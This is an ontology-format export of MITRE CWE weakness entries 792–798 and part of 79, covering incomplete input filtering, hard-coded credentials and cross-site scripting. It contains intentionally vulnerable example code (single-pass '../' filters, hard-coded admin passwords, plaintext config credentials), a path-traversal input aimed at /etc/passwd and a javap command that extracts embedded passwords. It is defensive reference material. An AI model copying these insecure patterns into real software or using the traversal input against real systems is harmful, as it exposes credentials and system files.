        rdfs:comment "The software receives data from an upstream component, but does not completely filter one or more instances of special elements before sending it to a downstream component."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     ID  "792"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. The following code takes untrusted input and uses a regular expression to filter \"../\" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.

(bad code)
Example Language: Perl 
my $Username = GetUntrustedInput();
$Username =~ s/\\.\\.\\///;
my $filename = \"/home/user/\" . $Username;
ReadAndSendFile($filename);
Since the regular expression does not have the /g global match modifier, it only removes the first instance of \"../\" it comes across. So an input value such as:

(attack code)
 
../../../etc/passwd
will have the first \"../\" stripped, resulting in:

(result)
 
../../etc/passwd
This value is then concatenated with the /home/user/ directory:

(result)
 
/home/user/../../etc/passwd
which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23)."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Unexpected State"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-793_Only_Filtering_One_Instance_of_a_Special_Element

    Annotations: 
        rdfs:comment "Incomplete filtering of this nature may be location-dependent, as in only the first or last element is filtered."^^xsd:string,
        rdfs:comment "The software receives data from an upstream component, but only filters a single instance of a special element before sending it to a downstream component."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     ID  "793"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. The following code takes untrusted input and uses a regular expression to filter \"../\" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.

(bad code)
Example Language: Perl 
my $Username = GetUntrustedInput();
$Username =~ s/\\.\\.\\///;
my $filename = \"/home/user/\" . $Username;
ReadAndSendFile($filename);
Since the regular expression does not have the /g global match modifier, it only removes the first instance of \"../\" it comes across. So an input value such as:

(attack code)
 
../../../etc/passwd
will have the first \"../\" stripped, resulting in:

(result)
 
../../etc/passwd
This value is then concatenated with the /home/user/ directory:

(result)
 
/home/user/../../etc/passwd
which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23)."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Unexpected State"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-794_Incomplete_Filtering_of_Multiple_Instances_of_Special_Elements

    Annotations: 
        rdfs:comment "Incomplete filtering of this nature may be applied to:
 - sequential elements (special elements that appear next to each other) or
 - non-sequential elements (special elements that appear multiple times in different locations)."^^xsd:string,
        rdfs:comment "The software receives data from an upstream component, but does not filter all instances of a special element before sending it to a downstream component."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     ID  "794"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. The following code takes untrusted input and uses a regular expression to filter \"../\" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.

(bad code)
Example Language: Perl 
my $Username = GetUntrustedInput();
$Username =~ s/\\.\\.\\///;
my $filename = \"/home/user/\" . $Username;
ReadAndSendFile($filename);
Since the regular expression does not have the /g global match modifier, it only removes the first instance of \"../\" it comes across. So an input value such as:

(attack code)
 
../../../etc/passwd
will have the first \"../\" stripped, resulting in:

(result)
 
../../etc/passwd
This value is then concatenated with the /home/user/ directory:

(result)
 
/home/user/../../etc/passwd
which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23)."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Unexpected State"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-795_Only_Filtering_Special_Elements_at_a_Specified_Location

    Annotations: 
        rdfs:comment "A filter might only account for instances of special elements when they occur:
 - relative to a marker (e.g. \"at the beginning/end of string; the second argument\"), or
 - at an absolute position (e.g. \"byte number 10\").
This may leave special elements in the data that did not match the filter position, but still may be dangerous."^^xsd:string,
        rdfs:comment "The software receives data from an upstream component, but only accounts for special elements at a specified location, thereby missing remaining special elements that may exist before sending it to a downstream component."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     ID  "795"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. The following code takes untrusted input and uses a regular expression to filter a \"../\" element located at the beginning of the input string. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.

(bad code)
Example Language: Perl 
my $Username = GetUntrustedInput();
$Username =~ s/^\\.\\.\\///;
my $filename = \"/home/user/\" . $Username;
ReadAndSendFile($filename);
Since the regular expression is only looking for an instance of \"../\" at the beginning of the string, it only removes the first \"../\" element. So an input value such as:

(attack code)
 
../../../etc/passwd
will have the first \"../\" stripped, resulting in:

(result)
 
../../etc/passwd
This value is then concatenated with the /home/user/ directory:

(result)
 
/home/user/../../etc/passwd
which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-22)."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Unexpected State"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-796_Only_Filtering_Special_Elements_Relative_to_a_Marker

    Annotations: 
        rdfs:comment "The software receives data from an upstream component, but only accounts for special elements positioned relative to a marker (e.g. \"at the beginning/end of a string; the second argument\"), thereby missing remaining special elements that may exist before sending it to a downstream component."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     ID  "796"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. The following code takes untrusted input and uses a regular expression to filter a \"../\" element located at the beginning of the input string. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.

(bad code)
Example Language: Perl 
my $Username = GetUntrustedInput();
$Username =~ s/^\\.\\.\\///;
my $filename = \"/home/user/\" . $Username;
ReadAndSendFile($filename);
Since the regular expression is only looking for an instance of \"../\" at the beginning of the string, it only removes the first \"../\" element. So an input value such as:

(attack code)
 
../../../etc/passwd
will have the first \"../\" stripped, resulting in:

(result)
 
../../etc/passwd
This value is then concatenated with the /home/user/ directory:

(result)
 
/home/user/../../etc/passwd
which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-22)."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Unexpected State"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-797_Only_Filtering_Special_Elements_at_an_Absolute_Position

    Annotations: 
        rdfs:comment "The software receives data from an upstream component, but only accounts for special elements at an absolute position (e.g. \"byte number 10\"), thereby missing remaining special elements that may exist before sending it to a downstream component."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     ID  "797"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. The following code takes untrusted input and uses a substring function to filter a 3-character \"../\" element located at the 0-index position of the input string. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.

(bad code)
Example Language: Perl 
my $Username = GetUntrustedInput();
if (substr($Username, 0, 3) eq '../') {
$Username = substr($Username, 3);
}
my $filename = \"/home/user/\" . $Username;
ReadAndSendFile($filename);
Since the if function is only looking for a substring of \"../\" between the 0 and 2 position, it only removes that specific \"../\" element. So an input value such as:

(attack code)
 
../../../etc/passwd
will have the first \"../\" filtered, resulting in:

(result)
 
../../etc/passwd
This value is then concatenated with the /home/user/ directory:

(result)
 
/home/user/../../etc/passwd
which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-22)."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Unexpected State"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-798_Use_of_Hard-coded_Credentials

    Annotations: 
        rdfs:comment "Hard-coded credentials typically create a significant hole that allows an attacker to bypass the authentication that has been configured by the software administrator. This hole might be difficult for the system administrator to detect. Even if detected, it can be difficult to fix, so the administrator may be forced into disabling the product entirely. There are two main variations:

Inbound: the software contains an authentication mechanism that checks the input credentials against a hard-coded set of credentials.
Outbound: the software connects to another system or component, and it contains hard-coded credentials for connecting to that component.
In the Inbound variant, a default administration account is created, and a simple password is hard-coded into the product and associated with that account. This hard-coded password is the same for each installation of the product, and it usually cannot be changed or disabled by system administrators without manually modifying the program, or otherwise patching the software. If the password is ever discovered or published (a common occurrence on the Internet), then anybody with knowledge of this password can access the product. Finally, since all installations of the software will have the same password, even across different organizations, this enables massive attacks such as worms to take place.

The Outbound variant applies to front-end systems that authenticate with a back-end service. The back-end service may require a fixed password which can be easily discovered. The programmer may simply hard-code those back-end credentials into the front-end software. Any user of that program may be able to extract the password. Client-side systems with hard-coded passwords pose even more of a threat, since the extraction of a password from a binary is usually very simple."^^xsd:string,
        rdfs:comment "The software contains hard-coded credentials, such as a password or cryptographic key, which it uses for its own inbound authentication, outbound communication to external components, or encryption of internal data."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     references  CVE-2005-0496,
     references  CVE-2005-3716,
     references  CVE-2005-3803,
     references  CVE-2006-7142,
     references  CVE-2008-0961,
     references  CVE-2008-1160,
     references  CVE-2008-2369,
     references  CVE-2010-1573,
     references  CVE-2010-2073,
     references  CVE-2010-2772,
     related_attack_patterns  CAPEC-190,
     related_attack_patterns  CAPEC-191,
     related_attack_patterns  CAPEC-70,
     ID  "798"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "If hard-coded passwords are used, it is almost certain that malicious users will gain access to the account in question."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "Execute Unauthorized Code or Commands"^^xsd:string,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     access_control  "Other"^^xsd:string,
     access_control  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "For front-end to back-end connections: Three solutions are possible, although none are complete.
- The first suggestion involves the use of generated passwords or keys that are changed automatically and must be entered at given time intervals by a system administrator. These passwords will be held in memory and only be valid for the time intervals.
- Next, the passwords or keys should be limited at the back end to only performing actions valid for the front end, as opposed to having full access.
- Finally, the messages sent should be tagged and checksummed with time sensitive values so as to prevent replay-style attacks."^^xsd:string, 
                 rdfs:comment "For inbound authentication using passwords: apply strong one-way hashes to passwords and store those hashes in a configuration file or database with appropriate access control. That way, theft of the file/database still requires the attacker to try to crack the password. When handling an incoming password during authentication, take the hash of the password and compare it to the saved hash.
Use randomly assigned salts for each separate hash that is generated. This increases the amount of computation that an attacker needs to conduct a brute-force attack, possibly limiting the effectiveness of the rainbow table method."^^xsd:string, 
                 rdfs:comment "For inbound authentication: Rather than hard-code a default username and password, key, or other authentication credentials for first time logins, utilize a \"first login\" mode that requires the user to enter a unique strong password or key."^^xsd:string, 
                 rdfs:comment "For outbound authentication: store passwords, keys, and other credentials outside of the code in a strongly-protected, encrypted configuration file or database that is protected from access by all outsiders, including other local users on the same system. Properly protect the key (CWE-320). If you cannot use encryption to protect the file, then make sure that the permissions are as restrictive as possible [REF-7].
In Windows environments, the Encrypted File System (EFS) may provide some protection."^^xsd:string, 
                 rdfs:comment "If the software must contain hard-coded credentials or they cannot be removed, perform access control checks and limit which entities can access the feature that requires the hard-coded credentials. For example, a feature might only be enabled through the system console instead of through a network connection."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     availability  "Gain Privileges or Assume Identity"^^xsd:string,
     availability  "Other"^^xsd:string,
     availability  "Read Application Data"^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string, 
                 rdfs:comment "This weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or even execute arbitrary code."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     confidentiality  "Gain Privileges or Assume Identity"^^xsd:string,
     confidentiality  "Other"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The following code examples attempt to verify a password using a hard-coded cryptographic key.

Example Language: C  /* (bad code) */
int VerifyAdmin(char *password) {
if (strcmp(password,\"68af404b513073584c4b6f22b6c63e6b\")) {

printf(\"Incorrect Password!\\n\");
return(0);
}
printf(\"Entering Diagnostic Mode...\\n\");
return(1);
}

Example Language: Java  /* (bad code) */
public boolean VerifyAdmin(String password) {
if (password.equals(\"68af404b513073584c4b6f22b6c63e6b\")) {
System.out.println(\"Entering Diagnostic Mode...\");
return true;
}
System.out.println(\"Incorrect Password!\");
return false;

Example Language: C#  /* (bad code) */
int VerifyAdmin(String password) {
if (password.Equals(\"68af404b513073584c4b6f22b6c63e6b\")) {
Console.WriteLine(\"Entering Diagnostic Mode...\");
return(1);
}
Console.WriteLine(\"Incorrect Password!\");
return(0);
}
The cryptographic key is within a hard-coded string value that is compared to the password. It is likely that an attacker will be able to read the key and compromise the system."^^xsd:string, 
                 rdfs:comment "The following code is an example of an internal hard-coded password in the back-end:

Example Language: C  /* (bad code) */
int VerifyAdmin(char *password) {
if (strcmp(password, \"Mew!\")) {

printf(\"Incorrect Password!\\n\");
return(0)
}
printf(\"Entering Diagnostic Mode...\\n\");
return(1);
}

Example Language: Java  /* (bad code) */
int VerifyAdmin(String password) {
if (passwd.Equals(\"Mew!\")) {
return(0)
}
//Diagnostic Mode
return(1);
}
Every instance of this program can be placed into diagnostic mode with the same password. Even worse is the fact that if this program is distributed as a binary-only distribution, it is very difficult to change that password or disable this \"functionality.\""^^xsd:string, 
                 rdfs:comment "The following code uses a hard-coded password to connect to a database:

Example Language: Java  /* (bad code) */
...
DriverManager.getConnection(url, \"scott\", \"tiger\");
...
This is an example of an external hard-coded password on the client-side of a connection. This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the database user \"scott\" with a password of \"tiger\" unless the program is patched. A devious employee with access to this information can use it to break into the system. Even worse, if attackers have access to the bytecode for application, they can use the javap -c command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:

(attack code)
 
javap -c ConnMngr.class
22: ldc #36; //String jdbc:mysql://ixne.com/rxsql
24: ldc #38; //String scott
26: ldc #17; //String tiger"^^xsd:string, 
                 rdfs:comment "The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in plaintext.

This Java example shows a properties file with a plaintext username / password pair.

Example Language: Java  /* (bad code) */

# Java Web App ResourceBundle properties file 
...
webapp.ldap.username=secretUsername
webapp.ldap.password=secretPassword
...
The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in plaintext.

Example Language: ASP.NET  /* (bad code)*/
...
<connectionStrings>
<add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;\" providerName=\"System.Data.Odbc\" />
</connectionStrings>
...
Username and password information should not be included in a configuration file or a properties file in plaintext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information and avoid CWE-260 and CWE-13."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Credential storage in configuration files is findable using black box methods, but the use of hard-coded credentials for an incoming authentication routine typically involves an account that is not visible outside of the code."^^xsd:string, 
                 rdfs:comment "Effectiveness: Moderate"^^xsd:string
                 
                 dynamic  "black box"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Network Sniffer
- Forced Path Execution"^^xsd:string, 
                 rdfs:comment "Dynamic Analysis with Manual Results Interpretation"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Attach the monitor to the process and perform a login. Using call trees or similar artifacts from the output, examine the associated behaviors and see if any of them appear to be comparing the input to a fixed string or value."^^xsd:string, 
                 rdfs:comment "For hard-coded credentials in incoming authentication: use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic."^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     integrity  "Gain Privileges or Assume Identity"^^xsd:string,
     integrity  "Other"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     other  "Execute Unauthorized Code or Commands"^^xsd:string,
     other  "Gain Privileges or Assume Identity"^^xsd:string,
     other  "Other"^^xsd:string,
     other  "Read Application Data"^^xsd:string,
     paradigms  "Mobile",
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Bytecode Weakness Analysis - including disassembler + source code weakness analysis
- Binary Weakness Analysis - including disassembler + source code weakness analysis"^^xsd:string, 
                 rdfs:comment "Analysis - Binary or Bytecode"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Configuration Checker"^^xsd:string, 
                 rdfs:comment "Analysis"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Source code Weakness Analyzer
- Context-configured Source Code Weakness Analyzer"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code"^^xsd:string, 
                 rdfs:comment "Effectiveness: High"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis"^^xsd:string, 
                 rdfs:comment "Automated white box techniques have been published for detecting hard-coded credentials for incoming authentication, but there is some expert disagreement regarding their effectiveness and applicability to a broad range of methods."^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies"^^xsd:string, 
                 rdfs:comment "Analysis - Binary or Bytecode"^^xsd:string, 
                 rdfs:comment "Effectiveness: High"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Focused Manual Spotcheck - Focused manual analysis of source
- Manual Source Code Review (not inspections)"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code"^^xsd:string, 
                 rdfs:comment "Effectiveness: High"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis"^^xsd:string, 
                 rdfs:comment "Note: These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."^^xsd:string, 
                 rdfs:comment "This weakness may be detectable using manual code analysis. Unless authentication is decentralized and applied throughout the software, there can be sufficient time for the analyst to find incoming authentication routines and examine the program logic looking for usage of hard-coded credentials. Configuration files could also be analyzed."^^xsd:string
                 
                 static  "manual"^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-79_Improper_Neutralization_of_Input_During_Web_Page_Generation

    Annotations: 
        rdfs:comment "Alternate Terms: 
XSS: - \"XSS\" is a common abbreviation for Cross-Site Scripting.
HTML Injection:	- \"HTML injection\" is used as a synonym of stored (Type 2) XSS.
CSS:  - In the early years after initial discovery of XSS, \"CSS\" was a commonly-used acronym. However, this would cause confusion with \"Cascading Style Sheets,\" so usage of this acronym has declined significantly."^^xsd:string,
        rdfs:comment "Applicable Platform:
XSS flaws are very common in web applications, since they require a great deal of developer discipline to avoid them."^^xsd:string,
        rdfs:comment "Background Details:
Same Origin Policy: The same origin policy states that browsers should limit the resources accessible to scripts running on a given web site, or \"origin\", to the resources associated with that web site on the client-side, and not the client-side resources of any other sites or \"origins\". The goal is to prevent one site from being able to modify or read the contents of an unrelated site. Since the World Wide Web involves interactions between many sites, this policy is important for browsers to enforce.
Domain:  The Domain of a website when referring to XSS is roughly equivalent to the resources associated with that website on the client-side of the connection. That is, the domain can be thought of as all resources the browser is storing for the user's interactions with this particular site."^^xsd:string,
        rdfs:comment "Cross-site scripting (XSS) vulnerabilities occur when:

1. Untrusted data enters a web application, typically from a web request.
2. The web application dynamically generates a web page that contains this untrusted data.
3. During page generation, the application does not prevent the data from containing content that is executable by a web browser, such as JavaScript, HTML tags, HTML attributes, mouse events, Flash, ActiveX, etc.
4. A victim visits the generated web page through a web browser, which contains malicious script that was injected using the untrusted data.
5. Since the script comes from a web page that was sent by the web server, the victim's web browser executes the malicious script in the context of the web server's domain.
6. This effectively violates the intention of the web browser's same-origin policy, which states that scripts in one domain should not be able to access resources or run code in a different domain.
There are three main kinds of XSS:

Type 1: Reflected XSS (or Non-Persistent) - The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.
Type 2: Stored XSS (or Persistent) - The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs.
Type 0: DOM-Based XSS - In DOM-based XSS, the client performs the injection of XSS into the page; in the other types, the server performs the injection. DOM-based XSS generally involves server-controlled, trusted script that is sent to the client, such as Javascript that performs sanity checks on a form before the user submits it. If the server-supplied script processes user-supplied data and then injects it back into the web page (such as with dynamic HTML), then DOM-based XSS is possible.
Once the malicious script is injected, the attacker can perform a variety of malicious activities. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker to compromise the victim's account on that web site. Finally, the script could exploit a vulnerability in the web browser itself possibly taking over the victim's machine, sometimes referred to as \"drive-by hacking.\"

In many cases, the attack can be launched without the victim even being aware of it. Even with careful users, attackers frequently use a variety of methods to encode the malicious portion of the attack, such as URL encoding or Unicode, so the request looks less suspicious."^^xsd:string,
        rdfs:comment "Relationship:
There can be a close relationship between XSS and CSRF (CWE-352). An attacker might use CSRF in order to trick the victim into submitting requests to the server in which the requests contain an XSS payload. A well-known example of this was the Samy worm on MySpace [REF-956]. The worm used XSS to insert malicious HTML sequences into a user's profile and add the attacker as a MySpace friend. MySpace friends of that victim would then execute the payload to modify their own profiles, causing the worm to propagate exponentially. Since the victims did not intentionally insert the malicious script themselves, CSRF was a root cause."^^xsd:string,
        rdfs:comment "The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "Stored XSS in a guestbook application using a javascript: URI in a bbcode img tag."^^xsd:string
                 
                 references  CVE-2006-3211,
     
     Annotations: rdfs:comment "Chain: library file is not protected against a direct request (CWE-425), leading to reflected XSS (CWE-79)."^^xsd:string
                 
                 references  CVE-2006-3295,
     
